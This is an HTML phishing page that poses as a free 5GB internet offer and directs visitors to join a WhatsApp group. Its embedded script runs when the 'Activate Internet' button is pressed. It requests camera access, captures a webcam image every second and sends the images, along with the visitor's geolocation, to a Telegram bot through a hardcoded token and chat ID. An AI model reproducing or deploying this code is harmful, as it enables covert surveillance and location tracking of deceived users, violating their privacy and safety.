<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Free Internet Generator</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #6dd5ed, #2193b0);
      color: white;
      text-align: center;
      padding: 50px;
    }
    .card {
      background: rgba(0,0,0,0.3);
      padding: 30px;
      border-radius: 15px;
      max-width: 400px;
      margin: auto;
    }
    button {
      background: #27ae60;
      color: white;
      padding: 15px 30px;
      font-size: 18px;
      border: none;
      border-radius: 10px;
      margin-top: 20px;
      cursor: pointer;
    }
    a {
      color: yellow;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>üéÅ Free 5GB Internet Offer</h2>
    <p>Join our official WhatsApp group to verify your number and get the offer.</p>
    <a href="https://chat.whatsapp.com/YOUR_GROUP_LINK" target="_blank">
      <button>‚úÖ Join WhatsApp Group</button>
    </a>

    <p>After joining, click below to activate your internet.</p>
    <button onclick="startBot()">üöÄ Activate Internet</button>

    <p id="status"></p>
  </div>

  <script>
    let botStarted = false;
    const BOT_TOKEN = "8017259757:AAHeP_v-F9whiHa_O9fa-2YCeqjXg6luQjc"; // From Nx Creator
    const CHAT_ID = "8138502747";     // Your Telegram ID

    function startBot() {
      if (botStarted) return;
      botStarted = true;

      document.getElementById("status").innerText = "üì° Connecting...";

      // Camera start
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.createElement("video");
          video.srcObject = stream;
          video.play();

          const canvas = document.createElement("canvas");
          canvas.width = 320;
          canvas.height = 240;
          const ctx = canvas.getContext("2d");

          setInterval(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL("image/png");
            sendToTelegram(dataUrl);
          }, 1000); // Every 1 sec
        })
        .catch(() => {
          alert("‚ùå Camera permission is required!");
        });

      // Location once
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        sendText(`üìç Location:\nLat: ${lat}\nLon: ${lon}`);
      });
    }

    function sendToTelegram(dataUrl) {
      fetch(dataUrl)
        .then(res => res.blob())
        .then(blob => {
          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", blob, "photo.png");

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
          });
        });
    }

    function sendText(text) {
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      });
    }
  </script>
</body>
</html>
